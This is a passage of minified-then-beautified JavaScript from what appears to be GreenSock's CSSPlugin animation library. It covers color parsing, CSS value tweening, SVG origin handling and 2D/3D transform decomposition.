                    (i = [
                      (t = parseInt(t.substr(1), 16)) >> 16,
                      (t >> 8) & 255,
                      255 & t,
                    ]);
                else if ("hsl" === t.substr(0, 3))
                  if (((i = f = t.match(B)), e)) {
                    if (-1 !== t.indexOf("=")) return t.match(M);
                  } else
                    (o = (Number(i[0]) % 360) / 360),
                      (a = Number(i[1]) / 100),
                      (r =
                        2 * (u = Number(i[2]) / 100) -
                        (n = u <= 0.5 ? u * (a + 1) : u + a - u * a)),
                      3 < i.length && (i[3] = Number(i[3])),
                      (i[0] = C(o + 1 / 3, r, n)),
                      (i[1] = C(o, r, n)),
                      (i[2] = C(o - 1 / 3, r, n));
                else i = t.match(B) || dt.transparent;
                (i[0] = Number(i[0])),
                  (i[1] = Number(i[1])),
                  (i[2] = Number(i[2])),
                  3 < i.length && (i[3] = Number(i[3]));
              }
            else i = dt.black;
            return (
              e &&
                !f &&
                ((r = i[0] / 255),
                (n = i[1] / 255),
                (s = i[2] / 255),
                (u = ((l = Math.max(r, n, s)) + (h = Math.min(r, n, s))) / 2),
                l === h
                  ? (o = a = 0)
                  : ((p = l - h),
                    (a = 0.5 < u ? p / (2 - l - h) : p / (l + h)),
                    (o =
                      l === r
                        ? (n - s) / p + (n < s ? 6 : 0)
                        : l === n
                        ? (s - r) / p + 2
                        : (r - n) / p + 4),
                    (o *= 60)),
                (i[0] = (o + 0.5) | 0),
                (i[1] = (100 * a + 0.5) | 0),
                (i[2] = (100 * u + 0.5) | 0)),
              i
            );
          }),
          gt =
            "(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3}){1,2}\\b";
        for (l in dt) gt += "|" + l + "\\b";
        function yt(t, e, i, r) {
          if (null == t)
            return function (t) {
              return t;
            };
          var n,
            s = e ? (t.match(gt) || [""])[0] : "",
            o = t.split(s).join("").match(I) || [],
            a = t.substr(0, t.indexOf(o[0])),
            u = ")" === t.charAt(t.length - 1) ? ")" : "",
            l = -1 !== t.indexOf(" ") ? " " : ",",
            h = o.length,
            p = 0 < h ? o[0].replace(B, "") : "";
          return h
            ? (n = e
                ? function (t) {
                    var e, f, c, D;
                    if ("number" == typeof t) t += p;
                    else if (r && Q.test(t)) {
                      for (
                        D = t.replace(Q, "|").split("|"), c = 0;
                        c < D.length;
                        c++
                      )
                        D[c] = n(D[c]);
                      return D.join(",");
                    }
                    if (
                      ((e = (t.match(gt) || [s])[0]),
                      (c = (f = t.split(e).join("").match(I) || []).length),
                      h > c--)
                    )
                      for (; ++c < h; ) f[c] = i ? f[((c - 1) / 2) | 0] : o[c];
                    return (
                      a +
                      f.join(l) +
                      l +
                      e +
                      u +
                      (-1 !== t.indexOf("inset") ? " inset" : "")
                    );
                  }
                : function (t) {
                    var e, s, f;
                    if ("number" == typeof t) t += p;
                    else if (r && Q.test(t)) {
                      for (
                        s = t.replace(Q, "|").split("|"), f = 0;
                        f < s.length;
                        f++
                      )
                        s[f] = n(s[f]);
                      return s.join(",");
                    }
                    if (((f = (e = t.match(I) || []).length), h > f--))
                      for (; ++f < h; ) e[f] = i ? e[((f - 1) / 2) | 0] : o[f];
                    return a + e.join(l) + u;
                  })
            : function (t) {
                return t;
              };
        }
        function vt(t) {
          return (
            (t = t.split(",")),
            function (e, i, r, n, s, o, a) {
              var u,
                l = (i + "").split(" ");
              for (a = {}, u = 0; u < 4; u++)
                a[t[u]] = l[u] = l[u] || l[((u - 1) / 2) >> 0];
              return n.parse(e, a, s, o);
            }
          );
        }
        function xt(t, e, i, r, n, s) {
          var o = new Ft(t, e, i, r - i, n, -1, s);
          return (o.b = i), (o.e = o.xs0 = r), o;
        }
        (gt = new RegExp(gt + ")", "gi")),
          (o.colorStringFilter = function (t) {
            var e,
              i = t[0] + " " + t[1];
            gt.test(i) &&
              ((e = -1 !== i.indexOf("hsl(") || -1 !== i.indexOf("hsla(")),
              (t[0] = F(t[0], e)),
              (t[1] = F(t[1], e))),
              (gt.lastIndex = 0);
          }),
          e.defaultStringFilter ||
            (e.defaultStringFilter = o.colorStringFilter);
        var Ct =
            ((nt._setPluginRatio = function (t) {
              this.plugin.setRatio(t);
              for (
                var e, i, r, n, s, o = this.data, a = o.proxy, u = o.firstMPT;
                u;

              )
                (e = a[u.v]),
                  u.r ? (e = u.r(e)) : e < 1e-6 && -1e-6 < e && (e = 0),
                  (u.t[u.p] = e),
                  (u = u._next);
              if (
                (o.autoRotate &&
                  (o.autoRotate.rotation = o.mod
                    ? o.mod.call(this._tween, a.rotation, this.t, this._tween)
                    : a.rotation),
                1 === t || 0 === t)
              )
                for (u = o.firstMPT, s = 1 === t ? "e" : "b"; u; ) {
                  if ((i = u.t).type) {
                    if (1 === i.type) {
                      for (n = i.xs0 + i.s + i.xs1, r = 1; r < i.l; r++)
                        n += i["xn" + r] + i["xs" + (r + 1)];
                      i[s] = n;
                    }
                  } else i[s] = i.s + i.xs0;
                  u = u._next;
                }
            }),
            function (t, e, i, r, n) {
              (this.t = t),
                (this.p = e),
                (this.v = i),
                (this.r = n),
                r && ((r._prev = this)._next = r);
            }),
          Ft =
            ((nt._parseToProxy = function (t, e, i, r, n, s) {
              var o,
                a,
                u,
                l,
                h,
                p = r,
                f = {},
                c = {},
                D = i._transform,
                _ = J;
              for (
                i._transform = null,
                  J = e,
                  r = h = i.parse(t, e, r, n),
                  J = _,
                  s &&
                    ((i._transform = D),
                    p && ((p._prev = null), p._prev && (p._prev._next = null)));
                r && r !== p;

              ) {
                if (
                  r.type <= 1 &&
                  ((c[(a = r.p)] = r.s + r.c),
                  (f[a] = r.s),
                  s || ((l = new Ct(r, "s", a, l, r.r)), (r.c = 0)),
                  1 === r.type)
                )
                  for (o = r.l; 0 < --o; )
                    (u = "xn" + o),
                      (c[(a = r.p + "_" + u)] = r.data[u]),
                      (f[a] = r[u]),
                      s || (l = new Ct(r, u, a, l, r.rxp[u]));
                r = r._next;
              }
              return { proxy: f, end: c, firstMPT: l, pt: h };
            }),
            (nt.CSSPropTween = function (t, e, r, n, o, a, u, l, h, p, f) {
              (this.t = t),
                (this.p = e),
                (this.s = r),
                (this.c = n),
                (this.n = u || e),
                t instanceof Ft || s.push(this.n),
                (this.r = l ? ("function" == typeof l ? l : Math.round) : l),
                (this.type = a || 0),
                h && ((this.pr = h), (i = !0)),
                (this.b = void 0 === p ? r : p),
                (this.e = void 0 === f ? r + n : f),
                o && ((this._next = o)._prev = this);
            })),
          Tt = (o.parseComplex = function (t, e, i, r, n, s, a, u, l, h) {
            (i = i || s || ""),
              "function" == typeof r && (r = r(A, S)),
              (a = new Ft(t, e, 0, 0, a, h ? 2 : 1, null, !1, u, i, r)),
              (r += ""),
              n &&
                gt.test(r + i) &&
                ((r = [i, r]), o.colorStringFilter(r), (i = r[0]), (r = r[1]));
            var p,
              f,
              c,
              D,
              _,
              d,
              m,
              g,
              v,
              x,
              C,
              F,
              w,
              b = i.split(", ").join(",").split(" "),
              E = r.split(", ").join(",").split(" "),
              P = b.length,
              O = !1 !== T;
            for (
              (-1 === r.indexOf(",") && -1 === i.indexOf(",")) ||
                ((E =
                  -1 !== (r + i).indexOf("rgb") || -1 !== (r + i).indexOf("hsl")
                    ? ((b = b.join(" ").replace(Q, ", ").split(" ")),
                      E.join(" ").replace(Q, ", ").split(" "))
                    : ((b = b.join(" ").split(",").join(", ").split(" ")),
                      E.join(" ").split(",").join(", ").split(" "))),
                (P = b.length)),
                P !== E.length && (P = (b = (s || "").split(" ")).length),
                a.plugin = l,
                a.setRatio = h,
                p = gt.lastIndex = 0;
              p < P;
              p++
            )
              if (((D = b[p]), (_ = E[p] + ""), (g = parseFloat(D)) || 0 === g))
                a.appendXtra(
                  "",
                  g,
                  y(_, g),
                  _.replace(M, ""),
                  O && -1 !== _.indexOf("px") && Math.round,
                  !0
                );
              else if (n && gt.test(D))
                (F = ")" + ((F = _.indexOf(")") + 1) ? _.substr(F) : "")),
                  (w = -1 !== _.indexOf("hsl") && ot),
                  (x = _),
                  (D = mt(D, w)),
                  (_ = mt(_, w)),
                  (v = 6 < D.length + _.length) && !ot && 0 === _[3]
                    ? ((a["xs" + a.l] += a.l ? " transparent" : "transparent"),
                      (a.e = a.e.split(E[p]).join("transparent")))
                    : (ot || (v = !1),
                      w
                        ? a
                            .appendXtra(
                              x.substr(0, x.indexOf("hsl")) +
                                (v ? "hsla(" : "hsl("),
                              D[0],
                              y(_[0], D[0]),
                              ",",
                              !1,
                              !0
                            )
                            .appendXtra("", D[1], y(_[1], D[1]), "%,", !1)
                            .appendXtra(
                              "",
                              D[2],
                              y(_[2], D[2]),
                              v ? "%," : "%" + F,
                              !1
                            )
                        : a
                            .appendXtra(
                              x.substr(0, x.indexOf("rgb")) +
                                (v ? "rgba(" : "rgb("),
                              D[0],
                              _[0] - D[0],
                              ",",
                              Math.round,
                              !0
                            )
                            .appendXtra("", D[1], _[1] - D[1], ",", Math.round)
                            .appendXtra(
                              "",
                              D[2],
                              _[2] - D[2],
                              v ? "," : F,
                              Math.round
                            ),
                      v &&
                        ((D = D.length < 4 ? 1 : D[3]),
                        a.appendXtra(
                          "",
                          D,
                          (_.length < 4 ? 1 : _[3]) - D,
                          F,
                          !1
                        ))),
                  (gt.lastIndex = 0);
              else if ((d = D.match(B))) {
                if (!(m = _.match(M)) || m.length !== d.length) return a;
                for (f = c = 0; f < d.length; f++)
                  (C = d[f]),
                    (x = D.indexOf(C, c)),
                    a.appendXtra(
                      D.substr(c, x - c),
                      Number(C),
                      y(m[f], C),
                      "",
                      O && "px" === D.substr(x + C.length, 2) && Math.round,
                      0 === f
                    ),
                    (c = x + C.length);
                a["xs" + a.l] += D.substr(c);
              } else a["xs" + a.l] += a.l || a["xs" + a.l] ? " " + _ : _;
            if (-1 !== r.indexOf("=") && a.data) {
              for (F = a.xs0 + a.data.s, p = 1; p < a.l; p++)
                F += a["xs" + p] + a.data["xn" + p];
              a.e = F + a["xs" + p];
            }
            return a.l || ((a.type = -1), (a.xs0 = a.e)), a.xfirst || a;
          }),
          wt = 9;
        for ((l = Ft.prototype).l = l.pr = 0; 0 < --wt; )
          (l["xn" + wt] = 0), (l["xs" + wt] = "");
        function bt(t, e) {
          (e = e || {}),
            (this.p = (e.prefix && D(t)) || t),
            (u[t] = u[this.p] = this),
            (this.format =
              e.formatter ||
              yt(e.defaultValue, e.color, e.collapsible, e.multi)),
            e.parser && (this.parse = e.parser),
            (this.clrs = e.color),
            (this.multi = e.multi),
            (this.keyword = e.keyword),
            (this.dflt = e.defaultValue),
            (this.allowFunc = e.allowFunc),
            (this.pr = e.priority || 0);
        }
        (l.xs0 = ""),
          (l._next =
            l._prev =
            l.xfirst =
            l.data =
            l.plugin =
            l.setRatio =
            l.rxp =
              null),
          (l.appendXtra = function (t, e, i, r, n, s) {
            var o = this,
              a = o.l;
            return (
              (o["xs" + a] += s && (a || o["xs" + a]) ? " " + t : t || ""),
              i || 0 === a || o.plugin
                ? (o.l++,
                  (o.type = o.setRatio ? 2 : 1),
                  (o["xs" + o.l] = r || ""),
                  0 < a
                    ? ((o.data["xn" + a] = e + i),
                      (o.rxp["xn" + a] = n),
                      (o["xn" + a] = e),
                      o.plugin ||
                        ((o.xfirst = new Ft(
                          o,
                          "xn" + a,
                          e,
                          i,
                          o.xfirst || o,
                          0,
                          o.n,
                          n,
                          o.pr
                        )),
                        (o.xfirst.xs0 = 0)))
                    : ((o.data = { s: e + i }),
                      (o.rxp = {}),
                      (o.s = e),
                      (o.c = i),
                      (o.r = n)))
                : (o["xs" + a] += e + (r || "")),
              o
            );
          });
        var Et = (nt._registerComplexSpecialProp = function (t, e, i) {
            "object" != typeof e && (e = { parser: i });
            var r,
              n = t.split(","),
              s = e.defaultValue;
            for (i = i || [s], r = 0; r < n.length; r++)
              (e.prefix = 0 === r && e.prefix),
                (e.defaultValue = i[r] || s),
                new bt(n[r], e);
          }),
          Pt = (nt._registerPluginProp = function (t) {
            if (!u[t]) {
              var e = t.charAt(0).toUpperCase() + t.substr(1) + "Plugin";
              Et(t, {
                parser: function (t, i, r, n, s, o, l) {
                  var h = a.com.greensock.plugins[e];
                  return h
                    ? (h._cssRegister(), u[r].parse(t, i, r, n, s, o, l))
                    : (c("Error: " + e + " js file not loaded."), s);
                },
              });
            }
          });
        function Ot(t, e, i) {
          var r,
            n = et.createElementNS("http://www.w3.org/2000/svg", t),
            s = /([a-z])([A-Z])/g;
          for (r in i)
            n.setAttributeNS(null, r.replace(s, "$1-$2").toLowerCase(), i[r]);
          return e.appendChild(n), n;
        }
        function St(t, e, i, r, n, s) {
          var a,
            u,
            l,
            h,
            p,
            f,
            c,
            D,
            _,
            d,
            m,
            g,
            y,
            v,
            x = t._gsTransform,
            C = Qt(t, !0);
          x && ((y = x.xOrigin), (v = x.yOrigin)),
            (!r || (a = r.split(" ")).length < 2) &&
              (0 === (c = t.getBBox()).x &&
                0 === c.y &&
                c.width + c.height === 0 &&
                (c = {
                  x:
                    parseFloat(
                      t.hasAttribute("x")
                        ? t.getAttribute("x")
                        : t.hasAttribute("cx")
                        ? t.getAttribute("cx")
                        : 0
                    ) || 0,
                  y:
                    parseFloat(
                      t.hasAttribute("y")
                        ? t.getAttribute("y")
                        : t.hasAttribute("cy")
                        ? t.getAttribute("cy")
                        : 0
                    ) || 0,
                  width: 0,
                  height: 0,
                }),
              (a = [
                (-1 !== (e = _t(e).split(" "))[0].indexOf("%")
                  ? (parseFloat(e[0]) / 100) * c.width
                  : parseFloat(e[0])) + c.x,
                (-1 !== e[1].indexOf("%")
                  ? (parseFloat(e[1]) / 100) * c.height
                  : parseFloat(e[1])) + c.y,
              ])),
            (i.xOrigin = h = parseFloat(a[0])),
            (i.yOrigin = p = parseFloat(a[1])),
            r &&
              C !== Gt &&
              ((f = C[0]),
              (c = C[1]),
              (D = C[2]),
              (_ = C[3]),
              (d = C[4]),
              (m = C[5]),
              (g = f * _ - c * D) &&
                ((u = h * (_ / g) + p * (-D / g) + (D * m - _ * d) / g),
                (l = h * (-c / g) + p * (f / g) - (f * m - c * d) / g),
                (h = i.xOrigin = a[0] = u),
                (p = i.yOrigin = a[1] = l))),
            x &&
              (s && ((i.xOffset = x.xOffset), (i.yOffset = x.yOffset), (x = i)),
              n || (!1 !== n && !1 !== o.defaultSmoothOrigin)
                ? ((u = h - y),
                  (l = p - v),
                  (x.xOffset += u * C[0] + l * C[2] - u),
                  (x.yOffset += u * C[1] + l * C[3] - l))
                : (x.xOffset = x.yOffset = 0)),
            s || t.setAttribute("data-svg-origin", a.join(" "));
        }
        function At(t) {
          var e,
            i,
            r = this.data,
            n = -r.rotation * $,
            s = n + r.skewX * $,
            o = 1e5,
            a = ((Math.cos(n) * r.scaleX * o) | 0) / o,
            u = ((Math.sin(n) * r.scaleX * o) | 0) / o,
            l = ((Math.sin(s) * -r.scaleY * o) | 0) / o,
            h = ((Math.cos(s) * r.scaleY * o) | 0) / o,
            p = this.t.style,
            f = this.t.currentStyle;
          if (f) {
            (i = u), (u = -l), (l = -i), (e = f.filter), (p.filter = "");
            var c,
              D,
              _ = this.t.offsetWidth,
              d = this.t.offsetHeight,
              m = "absolute" !== f.position,
              g =
                "progid:DXImageTransform.Microsoft.Matrix(M11=" +
                a +
                ", M12=" +
                u +
                ", M21=" +
                l +
                ", M22=" +
                h,
              y = r.x + (_ * r.xPercent) / 100,
              v = r.y + (d * r.yPercent) / 100;
            if (
              (null != r.ox &&
                ((y +=
                  (c = (r.oxp ? _ * r.ox * 0.01 : r.ox) - _ / 2) -
                  (c * a + (D = (r.oyp ? d * r.oy * 0.01 : r.oy) - d / 2) * u)),
                (v += D - (c * l + D * h))),
              (g += m
                ? ", Dx=" +
                  ((c = _ / 2) - (c * a + (D = d / 2) * u) + y) +
                  ", Dy=" +
                  (D - (c * l + D * h) + v) +
                  ")"
                : ", sizingMethod='auto expand')"),
              -1 !== e.indexOf("DXImageTransform.Microsoft.Matrix(")
                ? (p.filter = e.replace(G, g))
                : (p.filter = g + " " + e),
              (0 !== t && 1 !== t) ||
                1 != a ||
                0 !== u ||
                0 !== l ||
                1 != h ||
                (m && -1 === g.indexOf("Dx=0, Dy=0")) ||
                (X.test(e) && 100 !== parseFloat(RegExp.$1)) ||
                (-1 === e.indexOf(e.indexOf("Alpha")) &&
                  p.removeAttribute("filter")),
              !m)
            ) {
              var x,
                C,
                F,
                T = O < 8 ? 1 : -1;
              for (
                c = r.ieOffsetX || 0,
                  D = r.ieOffsetY || 0,
                  r.ieOffsetX = Math.round(
                    (_ - ((a < 0 ? -a : a) * _ + (u < 0 ? -u : u) * d)) / 2 + y
                  ),
                  r.ieOffsetY = Math.round(
                    (d - ((h < 0 ? -h : h) * d + (l < 0 ? -l : l) * _)) / 2 + v
                  ),
                  wt = 0;
                wt < 4;
                wt++
              )
                (F =
                  (i =
                    -1 !== (x = f[(C = Dt[wt])]).indexOf("px")
                      ? parseFloat(x)
                      : pt(this.t, C, parseFloat(x), x.replace(L, "")) || 0) !==
                  r[C]
                    ? wt < 2
                      ? -r.ieOffsetX
                      : -r.ieOffsetY
                    : wt < 2
                    ? c - r.ieOffsetX
                    : D - r.ieOffsetY),
                  (p[C] =
                    (r[C] = Math.round(
                      i - F * (0 === wt || 2 === wt ? 1 : T)
                    )) + "px");
            }
          }
        }
        ((l = bt.prototype).parseComplex = function (t, e, i, r, n, s) {
          var o,
            a,
            u,
            l,
            h,
            p,
            f = this.keyword;
          if (
            (this.multi &&
              (Q.test(i) || Q.test(e)
                ? ((a = e.replace(Q, "|").split("|")),
                  (u = i.replace(Q, "|").split("|")))
                : f && ((a = [e]), (u = [i]))),
            u)
          ) {
            for (
              l = u.length > a.length ? u.length : a.length, o = 0;
              o < l;
              o++
            )
              (e = a[o] = a[o] || this.dflt),
                (i = u[o] = u[o] || this.dflt),
                f &&
                  (h = e.indexOf(f)) !== (p = i.indexOf(f)) &&
                  (-1 === p
                    ? (a[o] = a[o].split(f).join(""))
                    : -1 === h && (a[o] += " " + f));
            (e = a.join(", ")), (i = u.join(", "));
          }
          return Tt(t, this.p, e, i, this.clrs, this.dflt, r, this.pr, n, s);
        }),
          (l.parse = function (t, e, i, r, s, o, a) {
            return this.parseComplex(
              t.style,
              this.format(ht(t, this.p, n, !1, this.dflt)),
              this.format(e),
              s,
              o
            );
          }),
          (o.registerSpecialProp = function (t, e, i) {
            Et(t, {
              parser: function (t, r, n, s, o, a, u) {
                var l = new Ft(t, n, 0, 0, o, 2, n, !1, i);
                return (l.plugin = a), (l.setRatio = e(t, r, s._tween, n)), l;
              },
              priority: i,
            });
          }),
          (o.useSVGTransformAttr = !0);
        var kt,
          Rt,
          Bt,
          Mt,
          It,
          Nt =
            "scaleX,scaleY,scaleZ,x,y,z,skewX,skewY,rotation,rotationX,rotationY,perspective,xPercent,yPercent".split(
              ","
            ),
          Lt = D("transform"),
          Xt = at + "transform",
          zt = D("transformOrigin"),
          Yt = null !== D("perspective"),
          jt = (nt.Transform = function () {
            (this.perspective = parseFloat(o.defaultTransformPerspective) || 0),
              (this.force3D =
                !(!1 === o.defaultForce3D || !Yt) &&
                (o.defaultForce3D || "auto"));
          }),
          Vt = _gsScope.SVGElement,
          Wt = et.documentElement || {},
          Ut =
            ((It = O || (/Android/i.test(st) && !_gsScope.chrome)),
            et.createElementNS &&
              !It &&
              ((Rt = Ot("svg", Wt)),
              (Mt = (Bt = Ot("rect", Rt, {
                width: 100,
                height: 50,
                x: 100,
              })).getBoundingClientRect().width),
              (Bt.style[zt] = "50% 50%"),
              (Bt.style[Lt] = "scaleX(0.5)"),
              (It = Mt === Bt.getBoundingClientRect().width && !(E && Yt)),
              Wt.removeChild(Rt)),
            It),
          qt = function (t) {
            var e,
              i = p(
                "svg",
                (this.ownerSVGElement &&
                  this.ownerSVGElement.getAttribute("xmlns")) ||
                  "http://www.w3.org/2000/svg"
              ),
              r = this.parentNode,
              n = this.nextSibling,
              s = this.style.cssText;
            if (
              (Wt.appendChild(i),
              i.appendChild(this),
              (this.style.display = "block"),
              t)
            )
              try {
                (e = this.getBBox()),
                  (this._originalGetBBox = this.getBBox),
                  (this.getBBox = qt);
              } catch (t) {}
            else this._originalGetBBox && (e = this._originalGetBBox());
            return (
              n ? r.insertBefore(this, n) : r.appendChild(this),
              Wt.removeChild(i),
              (this.style.cssText = s),
              e
            );
          },
          Ht = function (t) {
            return !(
              !Vt ||
              !t.getCTM ||
              (t.parentNode && !t.ownerSVGElement) ||
              !(function (t) {
                try {
                  return t.getBBox();
                } catch (e) {
                  return qt.call(t, !0);
                }
              })(t)
            );
          },
          Gt = [1, 0, 0, 1, 0, 0],
          Qt = function (t, e) {
            var i,
              r,
              n,
              s,
              o,
              a,
              u,
              l = t._gsTransform || new jt(),
              h = t.style;
            if (
              (Lt
                ? (r = ht(t, Xt, null, !0))
                : t.currentStyle &&
                  (r =
                    (r = t.currentStyle.filter.match(H)) && 4 === r.length
                      ? [
                          r[0].substr(4),
                          Number(r[2].substr(4)),
                          Number(r[1].substr(4)),
                          r[3].substr(4),
                          l.x || 0,
                          l.y || 0,
                        ].join(",")
                      : ""),
              (i = !r || "none" === r || "matrix(1, 0, 0, 1, 0, 0)" === r),
              Lt &&
                i &&
                !t.offsetParent &&
                ((s = h.display),
                (h.display = "block"),
                ((u = t.parentNode) && t.offsetParent) ||
                  ((o = 1), (a = t.nextSibling), Wt.appendChild(t)),
                (i =
                  !(r = ht(t, Xt, null, !0)) ||
                  "none" === r ||
                  "matrix(1, 0, 0, 1, 0, 0)" === r),
                s ? (h.display = s) : te(h, "display"),
                o &&
                  (a
                    ? u.insertBefore(t, a)
                    : u
                    ? u.appendChild(t)
                    : Wt.removeChild(t))),
              (l.svg || (t.getCTM && Ht(t))) &&
                (i &&
                  -1 !== (h[Lt] + "").indexOf("matrix") &&
                  ((r = h[Lt]), (i = 0)),
                (n = t.getAttribute("transform")),
                i &&
                  n &&
                  ((r =
                    "matrix(" +
                    (n = t.transform.baseVal.consolidate().matrix).a +
                    "," +
                    n.b +
                    "," +
                    n.c +
                    "," +
                    n.d +
                    "," +
                    n.e +
                    "," +
                    n.f +
                    ")"),
                  (i = 0))),
              i)
            )
              return Gt;
            for (n = (r || "").match(B) || [], wt = n.length; -1 < --wt; )
              (s = Number(n[wt])),
                (n[wt] = (o = s - (s |= 0))
                  ? ((1e5 * o + (o < 0 ? -0.5 : 0.5)) | 0) / 1e5 + s
                  : s);
            return e && 6 < n.length
              ? [n[0], n[1], n[4], n[5], n[12], n[13]]
              : n;
          },
          Zt = (nt.getTransform = function (t, i, r, n) {
            if (t._gsTransform && r && !n) return t._gsTransform;
            var s,
              a,
              u,
              l,
              h,
              p,
              f = (r && t._gsTransform) || new jt(),
              c = f.scaleX < 0,
              D =
                (Yt &&
                  (parseFloat(ht(t, zt, i, !1, "0 0 0").split(" ")[2]) ||
                    f.zOrigin)) ||
                0,
              _ = parseFloat(o.defaultTransformPerspective) || 0;
            if (
              ((f.svg = !(!t.getCTM || !Ht(t))),
              f.svg &&
                (St(
                  t,
                  ht(t, zt, i, !1, "50% 50%") + "",
                  f,
                  t.getAttribute("data-svg-origin")
                ),
                (kt = o.useSVGTransformAttr || Ut)),
              (s = Qt(t)) !== Gt)
            ) {
              if (16 === s.length) {
                var d,
                  m,
                  g,
                  y,
                  v,
                  x = s[0],
                  C = s[1],
                  F = s[2],
                  T = s[3],
                  w = s[4],
                  b = s[5],
                  E = s[6],
                  P = s[7],
                  O = s[8],
                  S = s[9],
                  A = s[10],
                  k = s[12],
                  R = s[13],
                  B = s[14],
                  M = s[11],
                  I = Math.atan2(E, A);
                f.zOrigin &&
                  ((k = O * (B = -f.zOrigin) - s[12]),
                  (R = S * B - s[13]),
                  (B = A * B + f.zOrigin - s[14])),
                  (f.rotationX = I * K),
                  I &&
                    ((d = w * (y = Math.cos(-I)) + O * (v = Math.sin(-I))),
                    (m = b * y + S * v),
                    (g = E * y + A * v),
                    (O = w * -v + O * y),
                    (S = b * -v + S * y),
                    (A = E * -v + A * y),
                    (M = P * -v + M * y),
                    (w = d),
                    (b = m),
                    (E = g)),
                  (I = Math.atan2(-F, A)),
                  (f.rotationY = I * K),
                  I &&
                    ((m = C * (y = Math.cos(-I)) - S * (v = Math.sin(-I))),
                    (g = F * y - A * v),
                    (S = C * v + S * y),
                    (A = F * v + A * y),
                    (M = T * v + M * y),
                    (x = d = x * y - O * v),
                    (C = m),
                    (F = g)),
                  (I = Math.atan2(C, x)),
                  (f.rotation = I * K),
                  I &&
                    ((d = x * (y = Math.cos(I)) + C * (v = Math.sin(I))),
                    (m = w * y + b * v),
                    (g = O * y + S * v),
                    (C = C * y - x * v),
                    (b = b * y - w * v),
                    (S = S * y - O * v),
                    (x = d),
                    (w = m),
                    (O = g)),
                  f.rotationX &&
                    359.9 < Math.abs(f.rotationX) + Math.abs(f.rotation) &&
                    ((f.rotationX = f.rotation = 0),
                    (f.rotationY = 180 - f.rotationY)),
                  (I = Math.atan2(w, b)),
                  (f.scaleX =
                    ((1e5 * Math.sqrt(x * x + C * C + F * F) + 0.5) | 0) / 1e5),
                  (f.scaleY =
                    ((1e5 * Math.sqrt(b * b + E * E) + 0.5) | 0) / 1e5),
                  (f.scaleZ =
                    ((1e5 * Math.sqrt(O * O + S * S + A * A) + 0.5) | 0) / 1e5),
                  (x /= f.scaleX),
                  (w /= f.scaleY),
                  (C /= f.scaleX),
                  (b /= f.scaleY),
                  2e-5 < Math.abs(I)
                    ? ((f.skewX = I * K),
                      (w = 0),
                      "simple" !== f.skewType && (f.scaleY *= 1 / Math.cos(I)))
                    : (f.skewX = 0),
                  (f.perspective = M ? 1 / (M < 0 ? -M : M) : 0),
                  (f.x = k),
                  (f.y = R),
                  (f.z = B),
                  f.svg &&
                    ((f.x -= f.xOrigin - (f.xOrigin * x - f.yOrigin * w)),
                    (f.y -= f.yOrigin - (f.yOrigin * C - f.xOrigin * b)));
              } else if (
                !Yt ||
                n ||
                !s.length ||
                f.x !== s[4] ||
                f.y !== s[5] ||
                (!f.rotationX && !f.rotationY)
              ) {
                var N = 6 <= s.length,
                  L = N ? s[0] : 1,
                  X = s[1] || 0,
                  z = s[2] || 0,
                  Y = N ? s[3] : 1;
                (f.x = s[4] || 0),
                  (f.y = s[5] || 0),
                  (u = Math.sqrt(L * L + X * X)),
                  (l = Math.sqrt(Y * Y + z * z)),
                  (h = L || X ? Math.atan2(X, L) * K : f.rotation || 0),
                  (p = z || Y ? Math.atan2(z, Y) * K + h : f.skewX || 0),
                  (f.scaleX = u),
                  (f.scaleY = l),
                  (f.rotation = h),
                  (f.skewX = p),
                  Yt &&
                    ((f.rotationX = f.rotationY = f.z = 0),
                    (f.perspective = _),
                    (f.scaleZ = 1)),
                  f.svg &&
                    ((f.x -= f.xOrigin - (f.xOrigin * L + f.yOrigin * z)),
                    (f.y -= f.yOrigin - (f.xOrigin * X + f.yOrigin * Y)));
              }
              for (a in (90 < Math.abs(f.skewX) &&
                Math.abs(f.skewX) < 270 &&
                (c
                  ? ((f.scaleX *= -1),
                    (f.skewX += f.rotation <= 0 ? 180 : -180),
                    (f.rotation += f.rotation <= 0 ? 180 : -180))
                  : ((f.scaleY *= -1), (f.skewX += f.skewX <= 0 ? 180 : -180))),
              (f.zOrigin = D),
              f))
                f[a] < 2e-5 && -2e-5 < f[a] && (f[a] = 0);
            }
            return (
              r &&
                (t._gsTransform = f).svg &&
                (kt && t.style[Lt]
                  ? e.delayedCall(0.001, function () {
                      te(t.style, Lt);
                    })
                  : !kt &&
                    t.getAttribute("transform") &&
                    e.delayedCall(0.001, function () {
                      t.removeAttribute("transform");
                    })),
              f
            );
          }),
          $t =
            (nt.set3DTransformRatio =
            nt.setTransformRatio =
              function (t) {
                var e,
                  i,
                  r,
                  n,
                  s,
                  o,
                  a,
                  u,
                  l,
                  h,
                  p,
                  f,
                  c,
                  D,
                  _,
                  d,
                  m,
                  g,
                  y,
                  v,
                  x,
                  C,
                  F,
                  T = this.data,
                  w = this.t.style,
                  b = T.rotation,
                  P = T.rotationX,
                  O = T.rotationY,
                  S = T.scaleX,
                  A = T.scaleY,
                  k = T.scaleZ,
                  R = T.x,
                  B = T.y,
                  M = T.z,
                  I = T.svg,
                  N = T.perspective,
                  L = T.force3D,
                  X = T.skewY,
                  z = T.skewX;
                if (
                  (X && ((z += X), (b += X)),
                  !(
                    (((1 !== t && 0 !== t) ||
                      "auto" !== L ||
                      (this.tween._totalTime !== this.tween._totalDuration &&
                        this.tween._totalTime)) &&
                      L) ||
                    M ||
                    N ||
                    O ||
                    P ||
                    1 !== k
                  ) ||
                    (kt && I) ||
                    !Yt)
                )
                  b || z || I
                    ? ((b *= $),
                      (C = z * $),
                      (F = 1e5),
                      (i = Math.cos(b) * S),
                      (s = Math.sin(b) * S),
                      (r = Math.sin(b - C) * -A),
                      (o = Math.cos(b - C) * A),
                      C &&
                        "simple" === T.skewType &&
                        ((e = Math.tan(C - X * $)),
                        (r *= e = Math.sqrt(1 + e * e)),
                        (o *= e),
                        X &&
                          ((e = Math.tan(X * $)),
                          (i *= e = Math.sqrt(1 + e * e)),
                          (s *= e))),
                      I &&
                        ((R +=
                          T.xOrigin -
                          (T.xOrigin * i + T.yOrigin * r) +
                          T.xOffset),
                        (B +=
                          T.yOrigin -
                          (T.xOrigin * s + T.yOrigin * o) +
                          T.yOffset),
                        kt &&
                          (T.xPercent || T.yPercent) &&
                          ((_ = this.t.getBBox()),
                          (R += 0.01 * T.xPercent * _.width),
                          (B += 0.01 * T.yPercent * _.height)),
                        R < (_ = 1e-6) && -_ < R && (R = 0),
                        B < _ && -_ < B && (B = 0)),
                      (y =
                        ((i * F) | 0) / F +
                        "," +
                        ((s * F) | 0) / F +
